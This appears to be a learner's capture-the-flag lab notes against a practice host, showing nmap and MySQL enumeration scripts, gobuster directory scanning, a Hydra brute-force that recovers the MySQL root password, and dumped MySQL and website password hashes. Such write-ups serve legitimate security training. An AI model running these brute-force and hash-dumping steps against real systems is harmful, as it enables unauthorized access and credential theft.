10.10.65.173

nmap ports open
```
└─$ nmap -sV 10.10.65.173
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-04 19:36 PDT
Nmap scan report for 10.10.65.173
Host is up (0.17s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
3306/tcp open  mysql   MySQL 8.0.28-0ubuntu0.20.04.3
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.53 seconds

```

* anonymous FTP not allowed
* FTP with no username and no password is not allowed. 

Intercepted login POST request w/ Burp and passed the request to Sqlmap. Nothing appeared to be injectable. 

Ran nmap scripts to enumerate MySQL service on 3306
```
└─$ nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.10.65.173
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-04 19:22 PDT
Nmap scan report for 10.10.65.173
Host is up (0.17s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 8.0.28-0ubuntu0.20.04.3
| mysql-enum: 
|   Valid usernames: 
|     administrator:<empty> - Valid credentials
|     netadmin:<empty> - Valid credentials
|     guest:<empty> - Valid credentials
|     user:<empty> - Valid credentials
|     web:<empty> - Valid credentials
|     sysadmin:<empty> - Valid credentials
|     admin:<empty> - Valid credentials
|     webadmin:<empty> - Valid credentials
|     root:<empty> - Valid credentials
|     test:<empty> - Valid credentials
|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0
|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.28-0ubuntu0.20.04.3
|   Thread ID: 192
|   Capabilities flags: 65535
|   Some Capabilities: FoundRows, Support41Auth, SwitchToSSLAfterHandshake, Speaks41ProtocolOld, SupportsTransactions, IgnoreSigpipes, ODBCClient, InteractiveClient, SupportsLoadDataLocal, LongColumnFlag, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, LongPassword, DontAllowDatabaseTableColumn, SupportsCompression, ConnectWithDatabase, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: T=@de,pq\x12!F\x18\x04+;\L2F[
|_  Auth Plugin Name: caching_sha2_password

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.30 seconds

```

gobuster
```
└─$ gobuster dir -w /usr/share/wordlists/dirb/big.txt -x php,html,txt,js -u http://10.10.65.173/
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.65.173/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,txt,js
[+] Timeout:                 10s
===============================================================
2022/08/04 19:04:33 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htpasswd.js         (Status: 403) [Size: 277]
/.htaccess.js         (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/config.php           (Status: 200) [Size: 0]  
/index.php            (Status: 200) [Size: 1080]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/server-status        (Status: 403) [Size: 277]              
/welcome.php          (Status: 302) [Size: 0] [--> login.php]
```


watched a walkthrough where a person enumerated using Hydra with the username `root`.
I used hydra earlier with the list of usernames that came from the mysql dump and when using that list, hydra kept crashing the service.
```
└─$ sudo hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://10.10.65.173                                                                               
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-04 19:55:31
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking mysql://10.10.65.173:3306/
[3306][mysql] host: 10.10.65.173   login: root   password: rockyou
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-04 19:55:46
```

root:rockyou

```
MySQL [mysql]> select User,authentication_string from user;
+------------------+------------------------------------------------------------------------+
| User             | authentication_string                                                  |
+------------------+------------------------------------------------------------------------+
| root             | $A$005$0f0
                               ;Uf:"k▒Z"NoVhWRJPlf/Ze29NzGOEaiQEqzh4ILQ4QpFl4tfJL2Hc/ |
| adrian           | $A$005$-NrS1
                                 XlN[|.ym"m6Ok/tcapFZgX7B0TXbarUydkFmKXLVQFnXLytImYBmbd1 |
| debian-sys-maint | $A$005$n:{T^3%/{5=+Z0Y1zOxlUB7mIrlVbAxA5t4ARcqMaY6i4k1AhaU2/W1 |
| mysql.infoschema | $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED |
| mysql.session    | $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED |
| mysql.sys        | $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED |
| root             | *E793DE9FF70DA71A13BA66833A5CB6AE2DD8D82B                              |
+------------------+------------------------------------------------------------------------+
```


website(db) -> users(table)
```
+----+----------+--------------------------------------------------------------+---------------------+
| id | username | password                                                     | created_at          |
+----+----------+--------------------------------------------------------------+---------------------+
|  1 | Adrian   | $2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we | 2021-10-20 02:43:42 |
+----+----------+--------------------------------------------------------------+---------------------+
1 row in set (0.171 sec)\
```
